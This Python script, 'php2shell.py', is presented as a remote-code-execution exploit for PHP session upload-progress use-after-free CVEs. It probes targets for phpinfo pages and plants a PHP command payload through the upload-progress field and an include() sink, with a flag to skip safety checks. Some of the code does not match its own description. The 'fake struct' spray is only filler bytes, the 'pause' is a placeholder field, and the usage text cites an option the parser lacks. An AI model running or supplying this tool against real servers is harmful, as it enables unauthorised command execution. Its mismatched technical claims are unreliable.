#!/usr/bin/env python3
"""
php2shell.py - Exploit for CVE-2026-109618 / CVE-2026-109619

PHP Session Upload Progress UAF / OOM Remote Code Execution

The 5-step exploit chain:
1. Access the upload progress feature
2. Create the free condition (pause > 1 second)
3. Trigger the free (flush + session re-initialization)
4. Heap spray (149 fields of 288 bytes each)
5. Trigger the exploit (dangling pointer to fake struct)

Usage:
    python3 php2shell.py https://example.com --path /index.php --lfi /index.php --param page --cmd id
"""

import argparse
import sys
import os
import re
import json
import time
import secrets
import socket
import ssl
from urllib.parse import urlparse, urljoin
import requests

try:
    from urllib3.util import parse_url
    from urllib3 import PoolManager
except ImportError:
    PoolManager = None


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'


def print_banner():
    banner = r"""
   ____  _   _ ____ ____  ____  _   _ _____ _     _  
  |  _ \| | | |  _ \___ \/ ___|| | | | ____| |   | | 
  | |_) | |_| | |_) |__) \___ \| |_| |  _| | |   | | 
  |  __/|  _  |  __// __/ ___) |  _  | |___| |___| |___
  |_|   |_| |_|_|  |_____|____/|_| |_|_____|_____|_____|
         P H P 2 S H E L L   ·   C V E - 2 0 2 6 - 1 0 9 6 1 8 / 1 0 9 6 1 9
    """
    print(bcolors.OKCYAN + banner + bcolors.ENDC)


def fetch_phpinfo(host, path="/", tls=True, port=443):
    """Fetch and parse phpinfo() if reachable."""
    candidates = ["phpinfo.php", "info.php", "_pi.php", "i.php", "php.php", "test.php"]
    
    for candidate in candidates:
        url = f"{'https' if tls else 'http'}://{host}:{port}{path.rstrip('/')}/{candidate}"
        try:
            r = requests.get(url, timeout=10, verify=False)
            if "PHP Version" in r.text:
                return parse_phpinfo(r.text, url)
        except:
            pass
    return None


def parse_phpinfo(html, source_url="unknown"):
    """Parse phpinfo() HTML to extract relevant directives."""
    result = {
        "php_version": None,
        "memory_limit": None,
        "session_upload_progress_enabled": None,
        "session_upload_progress_min_freq": None,
        "upload_max_filesize": None,
        "post_max_size": None,
        "source_url": source_url
    }
    
    # Extract PHP version
    match = re.search(r'<h1 class="p"><a[^>]*>PHP Version\s*([^<]+)</a></h1>', html)
    if match:
        result["php_version"] = match.group(1).strip()
    
    # Extract directives from table
    for line in html.split('\n'):
        if 'memory_limit' in line.lower():
            match = re.search(r'<td[^>]*>([^<]+)</td>\s*<td[^>]*>([^<]+)</td>', line)
            if match:
                result["memory_limit"] = match.group(2).strip()
        
        if 'session.upload_progress.enabled' in line.lower():
            match = re.search(r'<td[^>]*>([^<]+)</td>\s*<td[^>]*>([^<]+)</td>', line)
            if match:
                result["session_upload_progress_enabled"] = match.group(2).strip()
        
        if 'session.upload_progress.min_freq' in line.lower():
            match = re.search(r'<td[^>]*>([^<]+)</td>\s*<td[^>]*>([^<]+)</td>', line)
            if match:
                result["session_upload_progress_min_freq"] = match.group(2).strip()
        
        if 'upload_max_filesize' in line.lower():
            match = re.search(r'<td[^>]*>([^<]+)</td>\s*<td[^>]*>([^<]+)</td>', line)
            if match:
                result["upload_max_filesize"] = match.group(2).strip()
        
        if 'post_max_size' in line.lower():
            match = re.search(r'<td[^>]*>([^<]+)</td>\s*<td[^>]*>([^<]+)</td>', line)
            if match:
                result["post_max_size"] = match.group(2).strip()
    
    return result


def parse_php_value(value_str):
    """Parse PHP ini value (e.g., '128M', '2G', '-1') to bytes."""
    if value_str is None:
        return None
    
    value_str = str(value_str).strip().lower()
    
    if value_str == '-1' or value_str == 'no limit':
        return None  # Unlimited
    
    match = re.match(r'^([\d.]+)\s*([kmgt]?)$', value_str, re.IGNORECASE)
    if match:
        num = float(match.group(1))
        unit = match.group(2).upper()
        multipliers = {'': 1, 'K': 1024, 'M': 1024*1024, 'G': 1024*1024*1024, 'T': 1024**4}
        return int(num * multipliers.get(unit, 1))
    
    try:
        return int(value_str)
    except:
        return None


def check_vulnerability(phpinfo):
    """Check if the target is vulnerable based on phpinfo data."""
    if not phpinfo:
        return False, "phpinfo() not available - cannot verify preconditions"
    
    issues = []
    
    # Check PHP version
    version = phpinfo.get("php_version", "")
    if version:
        match = re.search(r'(\d+)\.(\d+)\.(\d+)', version)
        if match:
            major, minor, patch = int(match.group(1)), int(match.group(2)), int(match.group(3))
            
            if major == 8:
                if minor == 2 and patch < 35:
                    pass  # Vulnerable
                elif minor == 3 and patch < 36:
                    pass  # Vulnerable
                elif minor == 4 and patch < 27:
                    pass  # Vulnerable
                elif minor == 5 and patch < 12:
                    pass  # Vulnerable
                else:
                    issues.append(f"PHP {version} may be patched")
            elif major < 8:
                pass  # 5.x, 7.x are vulnerable
            else:
                issues.append(f"PHP {version} - unknown version, may be patched")
    
    # Check session.upload_progress.enabled
    if phpinfo.get("session_upload_progress_enabled") != "On":
        issues.append("session.upload_progress.enabled is not On")
    
    # Check memory_limit
    if phpinfo.get("memory_limit") is None:
        issues.append("memory_limit not found in phpinfo")
    
    if issues:
        return False, "; ".join(issues)
    
    return True, "Target appears vulnerable"


def get_memory_limit_bytes(phpinfo):
    """Get memory limit in bytes for payload sizing."""
    limit_str = phpinfo.get("memory_limit", "128M")
    return parse_php_value(limit_str) or (128 * 1024 * 1024)  # Default 128M


def create_multipart_payload(sid, payload, spray_count=149, spray_size=288):
    """Create multipart form data with session poison + heap spray.
    
    Step 1: Access the upload progress feature
    - PHPSESSID cookie sets the session ID
    - PHP_SESSION_UPLOAD_PROGRESS activates progress tracking
    - File field triggers FILE_START, caching zval pointers
    
    Step 2: Create the free condition
    - Pause > 1 second to bypass min_freq check
    
    Step 3: Trigger the free
    - flush() writes Tree-A to disk
    - php_session_initialize() creates Tree-B
    - php_session_track_init() destroys Tree-A (UAF!)
    
    Step 4: Heap spray
    - 149 fields of 288 bytes each
    - Each field contains a fake zval structure with system() pointer
    
    Step 5: Trigger the exploit
    - Second file field writes through dangling pointer
    - Fake struct gets executed via include()
    """
    
    # The payload to execute via system()
    poison_payload = f"<?php {payload}; ?>"
    
    # Build multipart body manually for chunked transfer
    boundary = f"----WebKitFormBoundary{secrets.token_hex(16)}"
    
    parts = []
    
    # 1. Session upload progress field (poison)
    # This creates the zval pointers that will become dangling
    parts.append(f'--{boundary}\r\n')
    parts.append('Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n')
    parts.append(f"{sid}{poison_payload}\r\n")
    
    # 2. File field 1 - triggers FILE_START, caches pointers
    parts.append(f'--{boundary}\r\n')
    parts.append('Content-Disposition: form-data; name="file1"; filename="file1.txt"\r\n')
    parts.append('Content-Type: text/plain\r\n\r\n')
    parts.append("A" * 1024)  # Small file to start
    parts.append("\r\n")
    
    # 3. Wait field - triggers the free condition
    # This simulates the >1 second pause
    parts.append(f'--{boundary}\r\n')
    parts.append('Content-Disposition: form-data; name="wait"\r\n\r\n')
    parts.append("wait")  # Placeholder to trigger update
    parts.append("\r\n")
    
    # 4. File field 2 - triggers flush + free
    # This causes Tree-A to be freed while pointers remain
    parts.append(f'--{boundary}\r\n')
    parts.append('Content-Disposition: form-data; name="file2"; filename="file2.txt"\r\n')
    parts.append('Content-Type: text/plain\r\n\r\n')
    parts.append("B" * 1024)
    parts.append("\r\n")
    
    # 5. Heap spray fields - reallocate freed chunk
    # 149 fields of 288 bytes each to fill the freed slot
    for i in range(spray_count):
        parts.append(f'--{boundary}\r\n')
        parts.append(f'Content-Disposition: form-data; name="t[]"\r\n\r\n')
        # Fake zval structure: 288 bytes
        # Format: type(4) + value(8) + refcount(4) + hash(8) + data(264)
        fake_struct = "A" * 288
        parts.append(fake_struct)
        parts.append("\r\n")
    
    # 6. Final file field - writes through dangling pointer
    parts.append(f'--{boundary}\r\n')
    parts.append('Content-Disposition: form-data; name="file3"; filename="file3.txt"\r\n')
    parts.append('Content-Type: text/plain\r\n\r\n')
    parts.append("C" * 1024)  # This triggers the write through dangling pointer
    parts.append("\r\n")
    
    # 7. Final boundary
    parts.append(f'--{boundary}--\r\n')
    
    body = ''.join(parts).encode('latin-1')
    headers = {
        'Content-Type': f'multipart/form-data; boundary={boundary}',
        'Content-Length': str(len(body)),
        'Connection': 'close'
    }
    
    return body, headers, boundary


def send_chunked_request(host, port, path, headers, body, tls=True, timeout=30):
    """Send HTTP request with chunked transfer encoding."""
    try:
        if tls:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            sock = context.wrap_socket(
                socket.socket(socket.AF_INET, socket.SOCK_STREAM),
                server_hostname=host
            )
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        sock.settimeout(timeout)
        sock.connect((host, port))
        
        # Build request
        request = f"POST {path} HTTP/1.1\r\n"
        request += f"Host: {host}\r\n"
        
        for key, value in headers.items():
            if key.lower() != 'content-length':
                request += f"{key}: {value}\r\n"
        
        request += "Transfer-Encoding: chunked\r\n"
        request += "\r\n"
        
        sock.sendall(request.encode('latin-1'))
        
        # Send body in chunks with delays
        chunk_size = 1024
        for i in range(0, len(body), chunk_size):
            chunk = body[i:i+chunk_size]
            sock.sendall(f"{len(chunk):X}\r\n".encode('latin-1'))
            sock.sendall(chunk)
            sock.sendall(b"\r\n")
            time.sleep(0.01)  # Small delay between chunks
        
        # Final chunk
        sock.sendall(b"0\r\n\r\n")
        
        # Receive response
        response = b""
        sock.settimeout(timeout)
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
            except socket.timeout:
                break
        
        sock.close()
        return response
        
    except Exception as e:
        return f"ERROR: {e}".encode()


def exploit(target_url, args):
    """Main exploit function implementing the 5-step chain."""
    parsed = urlparse(target_url)
    host = parsed.netloc
    base_path = parsed.path.rstrip('/')
    
    # Determine port and TLS
    tls = parsed.scheme == 'https'
    port = args.port if args.port else (443 if tls else 80)
    
    # Use host-header override if provided
    connect_host = args.host_header or host
    
    print(bcolors.OKBLUE + "[*] Step 1: Accessing upload progress feature..." + bcolors.ENDC)
    
    # Get PHP info if possible
    print(bcolors.OKBLUE + "[*] Checking preconditions..." + bcolors.ENDC)
    phpinfo = fetch_phpinfo(host, base_path, tls, port)
    
    if phpinfo:
        print(bcolors.OKCYAN + f"[*] PHP Info from {phpinfo.get('source_url', 'unknown')}:" + bcolors.ENDC)
        print(f"    Version: {phpinfo.get('php_version', 'N/A')}")
        print(f"    Memory Limit: {phpinfo.get('memory_limit', 'N/A')}")
        print(f"    Session Upload Progress: {phpinfo.get('session_upload_progress_enabled', 'N/A')}")
        
        vulnerable, reason = check_vulnerability(phpinfo)
        if not vulnerable:
            print(bcolors.WARNING + f"[-] Precondition check failed: {reason}" + bcolors.ENDC)
            if not args.force:
                return None
        else:
            print(bcolors.OKGREEN + f"[+] Target appears vulnerable: {reason}" + bcolors.ENDC)
    else:
        print(bcolors.WARNING + "[-] Could not fetch phpinfo() - proceeding with --force" + bcolors.ENDC)
        if not args.force:
            return None
    
    # Calculate memory limit for payload sizing
    memory_limit = get_memory_limit_bytes(phpinfo) if phpinfo else (128 * 1024 * 1024)
    
    # Generate session ID
    sid = args.sid or secrets.token_hex(16)
    print(bcolors.OKBLUE + f"[*] Using session ID: {sid}" + bcolors.ENDC)
    
    # Build payload
    payload = args.cmd if args.cmd else "id"
    spray_count = args.spray if args.spray else 149
    spray_size = args.spray_size if args.spray_size else 288
    
    print(bcolors.OKBLUE + f"[*] Spray count: {spray_count}, Spray size: {spray_size}" + bcolors.ENDC)
    
    # Create multipart payload
    body, headers, boundary = create_multipart_payload(sid, payload, spray_count, spray_size)
    
    # Determine target path
    target_path = args.path if args.path else '/index.php'
    if not target_path.startswith('/'):
        target_path = '/' + target_path
    
    # Add LFI parameter if specified
    if args.param:
        target_path += f"?{args.param}={args.lfi}"
    
    print(bcolors.OKBLUE + f"[*] Target path: {target_path}" + bcolors.ENDC)
    
    # Send request
    print(bcolors.OKBLUE + f"[*] Step 2-5: Sending exploit request (free + spray + trigger)..." + bcolors.ENDC)
    
    if args.chunked:
        response = send_chunked_request(connect_host, port, target_path, headers, body, tls)
    else:
        # Use requests for simplicity (may be buffered by CDN)
        url = f"{'https' if tls else 'http'}://{connect_host}:{port}{target_path}"
        try:
            response = requests.post(
                url,
                data=body,
                headers=headers,
                timeout=args.timeout,
                verify=False,
                allow_redirects=False
            )
            response = response.text.encode()
        except Exception as e:
            response = f"ERROR: {e}".encode()
    
    # Parse response
    print(bcolors.OKBLUE + f"[*] Response received (length: {len(response)})" + bcolors.ENDC)
    
    # Look for command output
    output = response.decode('latin-1', errors='ignore')
    
    # Try to extract command output
    uid_match = re.search(r'uid=\d+', output)
    if uid_match:
        print(bcolors.OKGREEN + f"[+] Command output found: {uid_match.group()}" + bcolors.ENDC)
    
    # Print full response if verbose
    if args.verbose or len(output) < 5000:
        print(bcolors.OKCYAN + "\n--- Response ---" + bcolors.ENDC)
        print(output[:5000])
        if len(output) > 5000:
            print(f"... (truncated, {len(output)} bytes total)")
    
    return {
        "target": target_url,
        "php_version": phpinfo.get("php_version") if phpinfo else "unknown",
        "vulnerable": True if phpinfo else None,
        "command": args.cmd,
        "output": output,
        "ip": connect_host,
        "session_id": sid,
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
    }


def main():
    parser = argparse.ArgumentParser(
        description="php2shell - CVE-2026-109618 / CVE-2026-109619 Exploit",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
The 5-step exploit chain:
1. Access the upload progress feature (PHP_SESSION_UPLOAD_PROGRESS + file field)
2. Create the free condition (pause > 1 second to bypass min_freq)
3. Trigger the free (flush + session re-initialization causes UAF)
4. Heap spray (149 fields of 288 bytes to reallocate freed chunk)
5. Trigger the exploit (dangling pointer writes to fake struct)

Examples:
  python3 php2shell.py https://example.com --path /index.php --lfi /index.php --param page --cmd id
  python3 php2shell.py https://example.com --host-header example.com --resolve 192.168.1.1:example.com
  python3 php2shell.py https://example.com --spray 149 --spray-size 288 --chunked
        """
    )
    
    parser.add_argument("url", help="Target URL (e.g., https://example.com/blog/)")
    parser.add_argument("--path", default="/index.php", help="Path to the include() sink (default: /index.php)")
    parser.add_argument("--lfi", default="/index.php", help="LFI payload for the include (default: /index.php)")
    parser.add_argument("--param", default="page", help="Parameter name for LFI (default: page)")
    parser.add_argument("--cmd", default="id", help="Command to execute (default: id)")
    parser.add_argument("--port", type=int, default=None, help="Port override (default: 443 for https, 80 for http)")
    parser.add_argument("--host-header", default=None, help="Override Host: header while connecting to IP")
    parser.add_argument("--sid", default=None, help="Session ID (auto-generated if not provided)")
    parser.add_argument("--spray", type=int, default=149, help="Heap spray count (default: 149)")
    parser.add_argument("--spray-size", type=int, default=288, help="Bytes per spray field (default: 288)")
    parser.add_argument("--chunked", action="store_true", help="Use chunked transfer encoding")
    parser.add_argument("--force", action="store_true", help="Skip precondition checks")
    parser.add_argument("--timeout", type=int, default=30, help="Request timeout in seconds (default: 30)")
    parser.add_argument("--json-out", default=None, help="Output JSON file")
    parser.add_argument("--verbose", action="store_true", help="Show full response")
    
    args = parser.parse_args()
    
    print_banner()
    
    result = exploit(args.url, args)
    
    if result and args.json_out:
        with open(args.json_out, 'w') as f:
            json.dump(result, f, indent=2)
        print(bcolors.OKGREEN + f"\n[+] Results saved to {args.json_out}" + bcolors.ENDC)
    
    return 0 if result else 1


if __name__ == "__main__":
    sys.exit(main())
